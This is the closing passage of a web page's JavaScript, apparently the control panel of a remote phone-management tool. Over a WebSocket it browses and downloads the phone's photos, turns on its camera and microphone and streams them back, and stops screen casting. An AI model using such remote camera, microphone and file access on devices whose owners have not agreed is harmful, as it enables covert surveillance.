                        mItem.innerHTML = `<img src="${thumbSrc}"><div class="gallery-name">${esc(f?.name || '')}</div>`;
                    }
                    
                    // 保存压缩后的缩略图到缓存
                    const f = galleryCache[idx];
                    if (f) {
                        const fp = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
                        saveThumbToCache(fp, thumbSrc);
                    }
                });
            }
        }
        
        // 前端压缩图片为缩略图
        function compressToThumb(imgSrc, maxSize) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    let w = img.width, h = img.height;
                    if (w > h) { h = maxSize * h / w; w = maxSize; }
                    else { w = maxSize * w / h; h = maxSize; }
                    canvas.width = w; canvas.height = h;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, w, h);
                    resolve(canvas.toDataURL('image/jpeg', 0.7));
                };
                img.onerror = () => resolve(imgSrc);
                img.src = imgSrc;
            });
        }
        
        let quickPreviewIndex = -1;
        
        function quickPreviewImage(index, event) {
            if (event) event.stopPropagation();
            
            const f = galleryCache[index];
            if (!f) return;
            
            quickPreviewIndex = index;
            
            // 更新选中状态
            document.querySelectorAll('.quick-gallery-item').forEach(el => el.classList.remove('selected'));
            const item = document.querySelector(`.quick-gallery-item[data-qidx="${index}"]`);
            if (item) item.classList.add('selected');
            
            // 创建或更新预览面板
            let panel = document.getElementById('quickPreviewPanel');
            if (!panel) {
                panel = document.createElement('div');
                panel.id = 'quickPreviewPanel';
                panel.className = 'quick-preview-panel';
                panel.onclick = (e) => e.stopPropagation();
                quickShowModal.appendChild(panel);
            }
            
            panel.innerHTML = `
                <div class="preview-header">
                    <h4 title="${esc(f.name)}">${esc(f.name)}</h4>
                    <button class="btn btn-secondary btn-sm" onclick="closeQuickPreviewPanel(event)"><i class="fas fa-times"></i></button>
                </div>
                <div class="preview-body">
                    <div class="loading"><i class="fas fa-spinner fa-spin"></i> 加载中...</div>
                </div>
                <div class="preview-footer">
                    ${index > 0 ? `<button class="btn btn-secondary btn-sm" onclick="quickPreviewImage(${index-1}, event)"><i class="fas fa-chevron-left"></i> 上一张</button>` : ''}
                    <button class="btn btn-primary btn-sm" onclick="quickDownloadImage(${index}, event)"><i class="fas fa-download"></i> 下载</button>
                    <button class="btn btn-success btn-sm" onclick="quickOpenFullPreview(${index}, event)"><i class="fas fa-expand"></i> 全屏</button>
                    ${index < galleryCache.length - 1 ? `<button class="btn btn-secondary btn-sm" onclick="quickPreviewImage(${index+1}, event)">下一张 <i class="fas fa-chevron-right"></i></button>` : ''}
                </div>
            `;
            
            // 检查缓存获取图片
            const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
            getThumbFromCache(fullPath).then(cached => {
                if (cached) {
                    showQuickPreviewImage(cached);
                } else {
                    // 请求图片
                    quickPreviewPendingPath = fullPath;
                    send('slr_panelsend', 'changefiles', { comdtype: 'D', filepath: fullPath, filetype: 'fi' });
                }
            });
        }
        
        let quickPreviewPendingPath = null;
        
        function showQuickPreviewImage(imgSrc) {
            const body = document.querySelector('#quickPreviewPanel .preview-body');
            if (body) {
                body.innerHTML = `<img src="${imgSrc}" onclick="event.stopPropagation()">`;
            }
        }
        
        function closeQuickPreviewPanel(event) {
            if (event) event.stopPropagation();
            const panel = document.getElementById('quickPreviewPanel');
            if (panel) panel.remove();
            quickPreviewIndex = -1;
            document.querySelectorAll('.quick-gallery-item').forEach(el => el.classList.remove('selected'));
        }
        
        function quickDownloadImage(index, event) {
            if (event) event.stopPropagation();
            const f = galleryCache[index];
            if (!f) return;
            const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
            pendingDownloadFile = true; // 标记为用户主动下载
            send('slr_panelsend', 'changefiles', { comdtype: 'D', filepath: fullPath, filetype: 'fi' });
            toast('正在下载...');
        }
        
        function quickOpenFullPreview(index, event) {
            if (event) event.stopPropagation();
            closeQuickShow();
            previewGalleryImage(index);
        }
        
        function downloadGalleryImageData(filename) {
            const preview = document.getElementById('galleryPreview');
            if (!preview) return;
            const img = preview.querySelector('img');
            if (!img) return;
            
            const link = document.createElement('a');
            link.href = img.src;
            link.download = filename;
            link.click();
            toast('图片已保存');
        }
        
        function downloadGalleryImage(index) {
            if (!galleryCache[index]) return;
            const f = galleryCache[index];
            const fullPath = (f.path.endsWith('/') ? f.path : f.path + '/') + f.name;
            downloadFile(fullPath);
            toast('正在下载: ' + f.name);
        }

        function startCam() { const cam = document.getElementById('camSelect').value; send('slr_panelsend', 'cam', { SelectedCam: cam }); toast('开启相机...'); }
        function stopCam() { send('slr_panelsend', 'camoff'); document.getElementById('camDisplay').innerHTML = '<div class="screen-placeholder" style="color:var(--danger);"><i class="fas fa-stop-circle"></i><div>已关闭</div></div>'; toast('相机已关闭'); }
        function updateCam(img) { if (img) { document.getElementById('camDisplay').innerHTML = `<img src="data:image/jpeg;base64,${img}" style="max-width:100%;max-height:400px;">`; } }

        function startMic() { send('slr_panelsend', 'mic'); document.getElementById('micStatus').innerHTML = '<i class="fas fa-microphone" style="font-size:48px;color:var(--danger);animation:pulse 1s infinite;"></i><div style="margin-top:12px;">正在录音...</div>'; toast('开启录音...'); }
        function stopMic() { send('slr_panelsend', 'micoff'); document.getElementById('micStatus').innerHTML = '<i class="fas fa-microphone-slash" style="font-size:48px;color:var(--danger);opacity:0.5;"></i><div style="margin-top:12px;color:var(--danger);">已关闭</div>'; toast('录音已关闭'); }
        function playMic(data) { if (data) { const audio = new Audio('data:audio/wav;base64,' + data); audio.play().catch(() => {}); } }

        function esc(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
        function toast(msg, type = 'success') { const t = document.getElementById('toast'); const m = document.getElementById('toastMsg'); const i = t.querySelector('i'); m.textContent = msg; t.className = 'toast ' + type; i.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle'; i.style.color = type === 'success' ? 'var(--success)' : 'var(--danger)'; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 2500); }
        
        // 页面关闭/隐藏时自动停止投屏、相机、录音
        function cleanupStreams() {
            if (ws?.readyState === WebSocket.OPEN) {
                // 停止投屏
                if (currentScreenMode) {
                    ws.send(JSON.stringify({ pid: phoneId, itype: 'slr_panelsend', subc: 'screen', screentype: currentScreenMode + 'OFF' }));
                    currentScreenMode = null;
                    screenRunning = false;
                }
                // 停止相机
                ws.send(JSON.stringify({ pid: phoneId, itype: 'slr_panelsend', subc: 'camoff' }));
                // 停止录音
                ws.send(JSON.stringify({ pid: phoneId, itype: 'slr_panelsend', subc: 'micoff' }));
            }
        }
        
        // 页面关闭前清理
        window.addEventListener('beforeunload', cleanupStreams);
        
        // 切换标签页不做任何处理，让投屏持续运行
        // （浏览器后台时WebSocket仍然接收数据，只是渲染暂停）
    </script>
</body>
</html>
